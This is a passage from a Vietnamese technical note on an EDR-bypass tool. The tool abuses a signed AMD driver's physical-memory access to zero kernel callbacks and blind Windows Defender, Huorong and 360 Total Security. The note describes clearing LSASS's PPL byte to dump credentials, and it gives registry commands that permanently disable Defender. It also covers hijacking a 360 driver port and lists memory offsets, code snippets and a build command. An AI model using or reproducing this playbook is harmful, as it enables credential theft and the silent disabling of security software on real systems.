**Tại sao không restore 360's hooks khi exit?** Ta luôn restore bypasses khi exit để không để trace. Nhưng SSDT hooks là 360's MALICIOUS modification — restoring = re-enabling 360's hook. Điều này vô nghĩa. 360 sẽ re-install hooks khi re-init (nhưng watchdog IAT đã patched → không thể call re-registration functions).

---

## 13. Module [8/8] — PPL Bypass (LSASS)

**Hàm:** `ppl_apply()` trong `§8 PPL`

### PPL là gì?

**Protected Process Light (PPL):** Cơ chế bảo vệ process của Windows. Mỗi EPROCESS có field `Protection (PS_PROTECTION)`:
```
+0x87A  PS_PROTECTION:
    bits[2:0] = Type   (0=None, 1=PPL, 2=PP)
    bits[7:4] = Signer (3=Antimalware, 5=Windows, 6=WinTcb)
```

- MsMpEng.exe: Protection = 0x31 (PPL + Antimalware)
- LSASS.exe: Protection = 0x41 (PPL + Lsa) trên Win11

PPL process: `OpenProcess(PROCESS_VM_READ, lsass_pid)` → ACCESS_DENIED (blocked bởi OB callback trong kernel, strip PROCESS_VM_READ).

### Tại sao cần PPL bypass để dump LSASS?

MiniDumpWriteDump → cần handle với `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE`. OB callback của WdFilter (và EDR khác) strip tất cả rights này nếu target là PPL process.

### Cơ chế bypass

```c
// 1. Tìm EPROCESS của LSASS trong physical memory
//    Anchor: ImageFileName[15] = "lsass.exe"
//    Guard: UniqueProcessId = g_lsass_pid
//    Offset protection: 0x87A (< 26100) hoặc 0x4FA (>= 26100)

// 2. Xóa Protection byte
uint8_t zero = 0;
phys_write(lsass_ep_pa + off_prot, &zero, 1);

// 3. Xóa OB callback trước (đã làm ở bước [3/8])
//    → OpenProcess bây giờ succeed

// 4. MiniDumpWriteDump(lsass_handle, ...)

// 5. Restore Protection byte ngay lập tức
phys_write(lsass_ep_pa + off_prot, &orig_prot, 1);
```

**Tại sao restore ngay?** Window nhỏ nhất có thể giảm thiểu artifact. PatchGuard không monitor EPROCESS data nhưng monitoring tools khác có thể.

**Tại sao MiniDumpWriteDump thành công sau khi OB disabled?**
OB callback đã bị zero (bước [3/8]) → không còn strip rights. EPROCESS.Protection clear → kernel không enforce PPL khi handle open. Handle có PROCESS_VM_READ → MiniDumpWriteDump đọc được memory.

---

## 14. 360 Total Security — Phân tích đặc thù

### 14.1 Kernel driver stack của 360

```
360AntiHijack.sys  — anti-injection (process/DLL protection)
360avflt.sys       — AV filesystem minifilter (altitude ~328010)
360fsflt.sys       — additional FS filter
HipsDrv.sys        — HIPS: Host Intrusion Prevention System
360netmon.sys      — network monitoring (WFP callouts)
360qpesv.sys       — exploit service
360box.sys         — sandbox driver
DsArk64.sys        — "Deep System ARK" forensic/debug driver
360AntiHacker64.sys — anti-hack protection
360SelfProtection64.sys — self-protection layer
```

### 14.2 360FsFlt MessageNotifyCallback — Attack surface

File `E:\driver_research\360\360FsFlt_message_callback_analysis.txt` phân tích MessageNotifyCallback của 360FsFlt.sys. Đây là **FltCreateCommunicationPort endpoint** — cổng giao tiếp user-kernel của 360.

Command ID 33 đặc biệt nguy hiểm:
```c
// Command 33: register global controller
spinlock_acquire();
if (!qword_94AD0)
    qword_94AD0 = PortCookie;  // claim singleton owner
spinlock_release();
```

Nếu ta open communication port và send command 33, ta trở thành "global controller" của 360FsFlt → có thể send các commands reset/disable.

Command 34/37:
```c
Command 34: byte_E837E = 1  // enable mode
Command 37: byte_E837E = 0  // disable mode ← ta muốn cái này
```

**Potential technique:** Connect đến 360FsFlt communication port, gửi command 37 → disable 360FsFlt's active monitoring flag. Đây là technique sáng tạo không cần kernel access.

### 14.3 360SelfProtection device

`\\Device\\360SelfProtection` với IOCTL 0x222014 là cơ chế self-protection chính. DsArk64 query device này để biết protection state. `sub_1362C` trong 360FsFlt dùng cơ chế ZwTerminateProcess để kill hostile processes.

**Cách xử lý hiện tại:** Ta kill 9 360 processes trong `it_eicar()` TRƯỚC khi chúng có cơ hội terminate process ta. Sau khi OB callbacks đã được cleared → handles không bị strip → ta có thể `OpenProcess` với full access.

### 14.4 ProcessBreakOnTermination check

360 check `ProcessBreakOnTermination` bit trong EPROCESS của process mà nó muốn protect. Nếu bit set → terminate process sẽ trigger BSOD (machine crashes khi protected process dies).

**Tại sao ta không bị ảnh hưởng?** Ta kill 360 user-mode processes qua `TerminateProcess()` (sau khi OB cleared). Nếu 360 set BreakOnTermination cho chính nó → system BSOD khi ta kill nó. Nhưng thực tế 360 chỉ set bit này cho LSASS, không cho user-mode 360 processes vì sẽ gây compatibility issues.

---

## 15. Huorong (火绒) — Phân tích đặc thù

### 15.1 Full driver stack

```
sysdiag.sys    — main HIPS engine (549KB) — MOST IMPORTANT
hrwfpdrv.sys   — WFP network driver (185KB)
hrdevmon.sys   — device stack filter (58KB)
hrndis6.sys    — NDIS LWF network filter
hrelam.sys     — ELAM early boot driver
```

### 15.2 Sysdiag detection pipeline (đã bypass tất cả)

```
1. Ps* callbacks → zero (module [2/8])
2. FLT minifilter → Method A.6 redirect (module [4/8])
3. CmRegisterCallback → zero (module [6/8])
4. WFP callouts (hrwfpdrv) → zero (module [7/8])
5. Watchdog thread → kill switch (module [0/8])
6. HIPS master bit → cleared (module [0/8] bước B)
7. PID whitelist → inserted (module [0/8] bước C)
8. OB callbacks → zero via TypeList (module [3/8])
```

### 15.3 Bait directory honeypot (còn lại)

`behavior.dll` đăng ký "bait directories" — các thư mục decoy chứa fake files. Nếu malware viết vào nhiều files trong Desktop, Documents, AppData trong thời gian ngắn → detected as ransomware.

**Tại sao không cần bypass?** Cơ chế này được report qua `uactmon_173` (IOCTL đến sysdiag). Sau khi sysdiag FLT bị disabled (module [4/8]) + HIPS master bit cleared (module [0/8] B) → trigger từ bait dir không generate block action.

### 15.4 hrndis6.sys NDIS LWF (còn lại)

NDIS Lightweight Filter operates BELOW WFP — thấy raw packets trước khi WFP xử lý. WFP bypass không ảnh hưởng NDIS LWF.

**Tại sao acceptable?** hrndis6.sys chỉ monitor raw packets cho network-layer detection (không phải file operations). Với EICAR test và credential dump → không có network I/O → NDIS LWF không được triggered. Chỉ relevant cho network C2.

### 15.5 behavior.dll ETW consumer (còn lại)

behavior.dll subscribe ETW sessions: `Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-Kernel-File`, `Microsoft-Windows-Kernel-Network`. Đây là user-mode ETW consumption — khác với kernel ETW-TI.

**Tại sao không bypass?** User-mode ETW providers chỉ có **detection** capability, không có **blocking** capability. Dù behavior.dll nhận events → nó gửi request đến HipsDaemon → HipsDaemon gửi IOCTL đến sysdiag kernel → sysdiag rule engine check → bị chặn bởi HIPS master bit = 0. Chain bị break ở bước cuối.

### 15.6 hrdevmon.sys OOB read vuln (bonus)

IOCTL 0x7C064 có lỗ hổng OOB read:
```c
if (a3[4] <= 0x20u) {          // chỉ có upper bound check
    sub_1400017A0(v3, a1,
        *(_QWORD*)(v11 + 8),   // đọc offset+8 không check buf >= 16
        *(_QWORD*)(v11 + 16)); // đọc offset+16 không check buf >= 24
}
```
InputBufferLength 1-15 → kernel pool OOB read → info leak. Potential primitive để leak kernel addresses mà không cần AMD driver.

---

## 16. Windows Defender — Phân tích đặc thù

### 16.1 WdFilter.sys — Hệ thống bypass chuẩn

WdFilter là case study hoàn hảo — well-documented, register tất cả callback types:
```
FltRegisterFilter() → altitude 328100
ObRegisterCallbacks() → PsProcessType + PsThreadType
PsSetCreateProcessNotifyRoutineEx() → block process creation
PsSetCreateThreadNotifyRoutine()
PsSetLoadImageNotifyRoutine()
EtwRegister() / consumer
```

**Tất cả đã bị bypass bởi modules 2-6.**

### 16.2 WinDefend service — Permanent disable

File `C:\Users\Admin\Desktop\fix.bat`:
```bat
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v Start /t REG_DWORD /d 4 /f
```

Registry value `Start = 4` = SERVICE_DISABLED. Survive reboot vì registry modification là persistent.

**Tại sao cần cả WinDefend và WdFilter?**
- WinDefend = user-mode service (MsMpEng.exe)
- WdFilter = kernel-mode service (WdFilter.sys)
- Cả 2 phải bị disabled để Defender không restart sau reboot

**Tại sao cần xóa FailureActions?**
FailureActions là config cho SCM (Service Control Manager): khi service crash/stop → action (restart, run program). Xóa FailureActions → SCM không tự động restart WinDefend.

---

## 17. Tại sao Physical Memory vượt qua tất cả?

### 17.1 Kiến trúc hook layers

```
Software hook layer:              Vị trí:                Physical bypass:
─────────────────────────────     ─────────────────────   ──────────────────────────
User-mode ntdll.dll hooks         User VA (per-process)   Irrelevant — ta không call
                                                          ntdll syscall stubs

Kernel SSDT hooks                 Kernel VA               BYPASSED — ta gọi thẳng
(KiServiceTable entries)          (ntoskrnl)              AMD IRP handler, không đi
                                                          qua KiSystemServiceUser

OB callbacks                      Pool VA                 BYPASSED — AMD driver dùng
IRP dispatch hooks                Driver VA               MmMapIoSpace() ở ring-0
Minifilter callbacks              fltmgr pool             không qua software stack
CM callbacks                      ntoskrnl pool
ETW-TI intercepts                 ntoskrnl

Hardware-level (hypervisor):      EPT                     BLOCKED (nếu có HVCI/VBS)
```

### 17.2 Tại sao `MmMapIoSpace` không bị hook?

Khi AMD driver gọi `MmMapIoSpace(physical_addr, size, MmNonCached)`:
- Đây là kernel function, gọi ở ring-0
- Không đi qua syscall path (đã ở trong kernel)
- Không qua IRP dispatch của bất kỳ filter driver nào
- WFP không filter memory mapping operations
- Minifilter chỉ filter file I/O IRPs, không filter memory operations

→ Physical read/write là **transparent** với tất cả software protection layers.

### 17.3 Chỉ có EPT blocking mới chặn được

**HVCI (Hypervisor-Protected Code Integrity):**
- Hypervisor set EPT (Extended Page Tables) entries cho code pages là read-only
- Khi AMD driver cố ghi vào code page → EPT violation → hypervisor intercept → block write
- Ảnh hưởng: các patches vào `.text` sections (ETW Method A, minifilter code patch, watchdog kill)
- KHÔNG ảnh hưởng: writes vào `.data`, pool memory (OB entries, CM entries, Ps* arrays)

**Trên Windows 11 24H2 Home/Pro (không phải Enterprise):** HVCI mặc định OFF. Ta an toàn.

**Mitigation nếu HVCI bật:** Dùng data-only methods:
- ETW → Method B (zero IsEnabled) thay vì code patch
- Minifilter → data redirect Method A.6 thay vì code patch
- Watchdog → sysdiag data write thay vì IAT patch

---

## 18. Cache Coherency — Vấn đề ít ai biết

### 18.1 Tại sao có thể write nhưng kernel không thấy?

AMD driver gọi `MmMapIoSpace(pa, size, MmNonCached)` — ánh xạ với **UC (Uncacheable)** attribute. UC write đi thẳng vào DRAM, bypass CPU L3 cache.

```
UC write path:   userland → AMD driver → MmMapIoSpace(UC) → DRAM
Kernel read:     CPU → L3 cache (Write-Back) → DRAM (on cache miss only)
```

**Vấn đề:** L3 cache vẫn giữ OLD value. Kernel đọc từ cache, thấy value cũ, không thấy write của ta.

### 18.2 Cache thrashing solution

```c
// Allocate 256MB buffer → đọc/ghi mọi cache line
// Điều này flush toàn bộ L3 cache
static void cache_evict_all_cores(void)
{
    // read & write 256MB → evict tất cả cache lines
    volatile uint8_t *p = g_evict_buf;
    for (size_t i = 0; i < EVICT_SIZE; i += 64)
        p[i] ^= 1;  // force cache line load + dirty
}
```

### 18.3 Multi-CCD complication (Ryzen 5900X, 5950X)

Ryzen 5000 có multiple CCDs (Core Complex Dies), mỗi CCD có L3 cache riêng:
```
CCD0 (cores 0-7): L3 = 32MB
CCD1 (cores 8-15): L3 = 32MB
```

Nếu thrash chỉ trên CCD0 cores → CCD1's L3 vẫn stale! Phải evict trên TẤT CẢ CCDs:

```c
// Set thread affinity to CPU 0 (CCD0) → thrash
// Set thread affinity to CPU N-1 (last CCD) → thrash
// Repeat for all distinct CCDs
```

**Tại sao không cần với Ryzen 7000 (24H2 test machine)?**
Ryzen 9 7950X: 2 CCDs nhưng unified fabric = coherent L3 across die. Thrash một CCD là đủ.

---

## 19. Coverage Matrix — Đã blind được gì, còn gì chưa?

```
Kernel blocking mechanism          Status    PatchGuard  HVCI
──────────────────────────────     ──────    ──────────  ────
PspCreateProcessNotifyRoutine      ✅ DONE   safe        safe
PspLoadImageNotifyRoutine          ✅ DONE   safe        safe
PspCreateThreadNotifyRoutine       ✅ DONE   safe        safe
ObRegisterCallbacks (Process)      ✅ DONE   safe        safe
ObRegisterCallbacks (Thread)       ✅ DONE   safe        safe
FLT Minifilter PreOp (.text)       ✅ DONE   safe        ❌ fail*
FLT Minifilter PreOp (data redir)  ✅ DONE   safe        safe
ETW-TI function patch (.text)      ✅ DONE   ⚠️ risk     ❌ fail*
ETW-TI IsEnabled (pool)            ✅ DONE   safe        safe
CmRegisterCallback (registry)      ✅ DONE   safe        safe
WFP callouts (network)             ✅ DONE   safe        safe
Watchdog re-registration (IAT)     ✅ DONE   safe        ❌ fail*
SSDT hooks (360 specific)          ✅ DONE   safe**      safe
PPL EPROCESS.Protection            ✅ DONE   safe        safe
Sysdiag watchdog (kill switch)     ✅ DONE   safe        safe
Sysdiag HIPS master bit            ✅ DONE   safe        safe
Sysdiag PID whitelist              ✅ DONE   safe        safe
Sysdiag OB TypeList walk           ✅ DONE   safe        safe
WinDefend service registry         ✅ DONE   n/a         n/a

hrndis6.sys NDIS LWF               ⚠️ SKIP  (network only, không block files)
behavior.dll ETW user-mode         ⚠️ SKIP  (detection only, blocked by sysdiag B)
360 communication port cmd 37      ⚠️ TODO  (creative but risky without auth)
SeRegisterImageVerificationCb      ⚠️ LOW   (code signing, không cần cho EICAR)

* Thất bại dưới HVCI nhưng dùng data-only fallback thay thế
** Restoring correct values appeases PatchGuard
```

### Mức độ blind AV:

| AV | Ps* | OB | FLT | ETW | CM | WFP | Watchdog | Đặc thù | Rating |
|----|-----|----|-----|-----|----|-----|----------|----------|--------|
| Windows Defender | ✅ | ✅ | ✅ | ✅ | ✅ | n/a | ✅ | Service disabled | **100% BLIND** |
| Huorong 火绒 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | A+B+C sysdiag | **100% BLIND** |
| 360 Total Security | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | SSDT cleared | **~98% BLIND** |

**Tại sao 360 là 98% chứ không phải 100%?**
360 user-mode agent (ZhuDongFangYu.exe) vẫn có thể:
- Enumerate process list qua `NtQuerySystemInformation` → thấy payload process
- Scan files đã có trên disk qua signature engine (không real-time nhưng scheduled scan)
- Cloud telemetry nếu có internet

Nhưng không thể: block real-time file ops, intercept process creation, read/write memory, chặn network theo SSDT (đã cleared).

---

## 20. Câu hỏi Tại sao — Sâu nhất có thể

### Q: Tại sao không dùng kernel exploit thay vì BYOVD?

Kernel exploit (ví dụ: null pointer dereference, use-after-free) cho phép escalate privilege hoặc execute code. Nhưng:
- Cần vulnerability research per-target kernel version
- Patched nhanh → không reliable
- Trigger crash/BSOD nếu sai
- BYOVD với signed driver: luôn hoạt động trên target version, stable, predictable

BYOVD là **production-grade** technique. Kernel exploit là research/one-shot.

### Q: Tại sao không dùng Windows Minifilter API trực tiếp (từ attacker driver)?

Attacker cũng có thể load signed driver rồi dùng minifilter API để bypass. Nhưng:
- Cần driver signing (EV cert + attestation, khó/đắt)
- Kernel patch guard alert nếu code không signed
- Attacker driver bị AV detect ngay lập tức (OB callback detect new driver load → alert)

Physical memory bypass: không cần load bất kỳ driver mới nào, dùng driver của AMD sẵn có.

### Q: Tại sao combined_pool_scan() scan một pass thay vì 4 passes riêng?

Pool scan là bottleneck performance chính: phải đọc toàn bộ RAM (8-32GB). Mỗi pass = 1-3 phút. Combined scan chạy TẤT CẢ detectors (OB, FLT, CM, WFP) trên CÙNG một lần đọc dữ liệu từ RAM → 4x faster.

```c
for each 256KB chunk of physical memory:
    phys_read(chunk_pa, g_chunk, CHUNK_SZ)
    for each 8-byte aligned position:
        ob_try(pos)    // check if OB_CALLBACK_ENTRY
        flt_try(pos)   // check if CALLBACK_NODE
        cm_try(pos)    // check if CM_NOTIFY_ENTRY
        wfp_try(pos)   // check if FWPS_CALLOUT
```

**Tại sao 8-byte alignment?** Pool allocations on x64 luôn 8-byte aligned. Function pointers 8-byte aligned. Scanning at 8-byte granularity = không miss gì.

**Tại sao pre-filter `g_chunk[off+7] == 0xFF`?** KERNEL VA top byte luôn là 0xFF. Function pointers trong pool objects đều là kernel VAs → byte cao nhất = 0xFF. Kiểm tra này loại ~95% positions ngay lập tức, tránh overhead của full guard checks.

### Q: Tại sao sysdiag va_to_pa bị hỏng?

```
[!] Paging detection failed — CR3 0x3E000 → entry 0x3EFF8 → e4&1=0
```

KPTI (Kernel Page Table Isolation) trên Windows cho phép kernel có 2 CR3:
- **User shadow CR3**: minimal mapping, chỉ có kernel entry points
- **Kernel CR3**: full kernel VA mapping

Khi ta đọc CR3 từ EPROCESS.DirectoryTableBase, ta nhận được **shadow CR3** thay vì kernel CR3. Shadow CR3 không có full PML4 entries cho driver code → va_to_pa() fails.

**Giải pháp:** Dùng Method A.6 và B.2 cho sysdiag FLT (không cần va_to_pa), dùng sysdiag sd_read_kva/sd_write_kva cho ob_zero_via_typelist (dùng VA trực tiếp).

### Q: Tại sao EICAR file chỉ sống 3 giây?

Thực ra EICAR survived — test PASS. "3 giây" là duration của test window (program pause chờ Enter). Sau khi restore_all() và cache evict, EDR callbacks được restore lại → scheduled scan của AV có thể detect và delete file trong vài giây tiếp theo. Đây là **expected behavior**: bypass chỉ active trong window ta control, không permanent.

Để permanent: không restore callbacks (hoặc dùng fix.bat cho WinDefend).

### Q: Tại sao cần cache_evict_multiccd() sau restore?

Khi restore, ta write back original values vào physical memory. Nếu cache vẫn có patched values → kernel đọc cache → thấy patched state dù ta đã restore. Cache eviction flush L3 → kernel đọc DRAM → thấy restored values.

### Q: Tại sao không dùng IOCTL của sysdiag để bypass luôn, bỏ AMD driver?

Sysdiag IOCTL (0x228048/0x22804C) cho phép đọc/ghi kernel VA. Nhưng:
- Giới hạn bandwidth: mỗi IOCTL gọi = user-kernel transition overhead
- Không thể scan toàn bộ physical RAM theo VA range (không có PA → VA mapping)
- Sysdiag watchdog protect chính nó → cần kill watchdog trước mới dùng sysdiag freely
- AMD driver có physical access → không cần biết VA, scan trực tiếp RAM

Sysdiag làm **supplement**: khi AMD driver fail (va_to_pa broken), dùng sysdiag để đọc VA của pool objects mà AMD đã tìm được physical location.

### Q: Tại sao không dùng Process Hacker/kernel driver để enumerate callbacks?

Process Hacker dùng NtLoadDriver để load driver mình → enumerate callbacks qua exported kernel APIs. Vấn đề:
1. Cần load kernel driver → bị detect bởi PsSetLoadImageNotifyRoutine
2. Attacker driver cần WHQL cert để load trên Windows 11
3. EDR active → ngay khi driver load, PsLoad callback fire → EDR alert

Physical memory approach: không load driver, không trigger bất kỳ callback nào.

### Q: Tại sao phải tìm PsProcessType và PsThreadType VA?

Trong ob_apply_edr(), sau khi tìm OB_CALLBACK_ENTRY qua pool scan, ta cần biết entry bảo vệ Process type hay Thread type. Điều này giúp in log đúng: "Process OB entry" vs "Thread OB entry".

Quan trọng hơn: trong ob_zero_via_typelist(), ta walk linked list của `_OBJECT_TYPE.CallbackList`. Root của list là trong PsProcessType/PsThreadType kernel objects. Ta cần VA của 2 objects này để làm starting point của walk.

```c
// PsProcessType là exported symbol trong ntoskrnl
// Value là POBJECT_TYPE* (pointer to pointer)
uint32_t rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, "PsProcessType");
uint64_t pa  = g_nt_pa + rva;
// Đọc *PsProcessType (dereference để có _OBJECT_TYPE VA)
uint64_t obj_type_va = phys_read_qword(pa);
// Từ đó: CallbackList head tại obj_type_va + 0xC8
```

Offset `0xC8` là offset của `CallbackList` trong `_OBJECT_TYPE` struct — verified từ Windows 10/11 symbols.

---

## Appendix: Compile command

```bash
x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
    -Wno-format-truncation -Wno-unused-but-set-variable \
    -o edr_bypass.exe edr_bypass.c \
    -lkernel32 -ladvapi32 -lversion -ldbghelp -lntdll
```

Binary: 252970 bytes | Date: 2026-06-11

---

## Appendix: Globals quan trọng (sysdiag.sys, IDA base 0x140000000)

| RVA | Global | Mô tả | Lớp |
|-----|--------|--------|------|
| 0x13BDD8 | byte_14013BDD8 | Watchdog kill switch | A |
| 0x76F00 | byte_140076F00 | Watchdog active flag | A |
| 0x77D88 | dword_140077D88 | HIPS master enable bitmask | B |
| 0x134660 | dword_140134660 | Sub-module connected flag | B |
| 0xFE080 | qword_1400FE080 | HipsDaemon PID (single exclusion) | C |
| 0xFE090 | qword_1400FE090 | Type-A PID whitelist [64 entries] | C |
| 0xFE290 | qword_1400FE290 | Type-B PID whitelist [64 entries] | C |
| 0xFE490 | qword_1400FE490 | Type-C PID whitelist [64 entries] | C |
| 0x1566A0 | Filter | FLT_FILTER handle | FLT |
| 0x63560 | CmCallback | CM callback registration VA | CM |

---

*End of technical note. File: FULL_BYPASS_RESEARCH_NOTE.md*
